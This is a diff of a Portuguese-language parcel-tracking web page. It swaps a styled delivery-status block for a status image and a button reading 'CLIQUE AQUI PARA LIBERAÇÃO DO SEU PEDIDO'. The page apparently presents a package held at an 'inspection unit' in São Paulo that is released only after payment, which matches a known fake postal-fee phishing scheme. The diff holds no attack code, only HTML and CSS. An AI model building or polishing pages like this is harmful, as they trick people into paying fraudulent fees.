@@ -439,6 +439,15 @@
     .status-info p {
       margin: 5px 0;
     }
+
+    /* Nova imagem de status */
+    .status-image {
+      width: 100%;
+      max-width: 600px;
+      margin: 20px auto;
+      display: block;
+      border-radius: 8px;
+    }
   </style>
 </head>
 
@@ -532,93 +541,15 @@
       <div class="caixa-image">
         <img src="images/Caixa.png" alt="Caixa">
       </div>
-      
-      <!-- Adicione isto dentro da seção #pagamento, substituindo ou complementando o conteúdo existente -->
-<div class="delivery-status">
-  <h3>Previsão de Entrega</h3>
-  <p>3 dias após o pagamento</p>
-  
-  <div class="status-info">
-    <p class="status-item">
-      <span class="status-icon">•</span> Objeto aguardando sua confirmação<br>
-      <span class="status-detail">em Unidade de Fiscalização em São Paulo</span>
-    </p>
-    <p class="status-item">
-      <span class="status-icon">•</span> Realize o pagamento: <button class="payment-btn">Efetuar Pagamento</button>
-    </p>
-    <p class="status-item">
-      <span class="status-icon">•</span> Objeto em transferência - por favor aguarde
-    </p>
-    <p class="status-item">
-      <span class="status-icon">•</span> Objeto Postado
-    </p>
-  </div>
-</div>
 
-<style>
-  .delivery-status {
-    margin: 25px 0;
-    font-family: 'Futura No. 2', Arial, sans-serif;
-    color: #003157;
-  }
-  
-  .delivery-status h3 {
-    font-weight: bold;
-    font-size: 16px;
-    margin-bottom: 10px;
-    text-align: left;
-  }
-  
-  .delivery-status p {
-    font-size: 14px;
-    margin-bottom: 20px;
-    text-align: left;
-  }
-  
-  .status-info {
-    border-left: 2px solid #D4AF37;
-    padding-left: 15px;
-  }
-  
-  .status-item {
-    margin-bottom: 15px;
-    font-size: 14px;
-    position: relative;
-    padding-left: 20px;
-    line-height: 1.4;
-  }
-  
-  .status-icon {
-    position: absolute;
-    left: 0;
-    color: #D4AF37;
-    font-weight: bold;
-  }
-  
-  .status-detail {
-    display: block;
-    color: #666;
-    font-size: 13px;
-    margin-left: 20px;
-    margin-top: 3px;
-  }
-  
-  .payment-btn {
-    background-color: #003157;
-    color: white;
-    border: none;
-    border-radius: 4px;
-    padding: 6px 12px;
-    font-size: 13px;
-    cursor: pointer;
-    margin-left: 5px;
-    transition: background-color 0.3s;
-  }
-  
-  .payment-btn:hover {
-    background-color: #001a33;
-  }
-</style>
+      <!-- IMAGEM DO STATUS DE ENTREGA -->
+      <img src="images/status-entrega.png" alt="Status da Entrega" class="status-image">
+      
+      <div class="btn-container">
+        <button id="btn-pagar">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
+        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
+      </div>
+    </section>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
       <div>
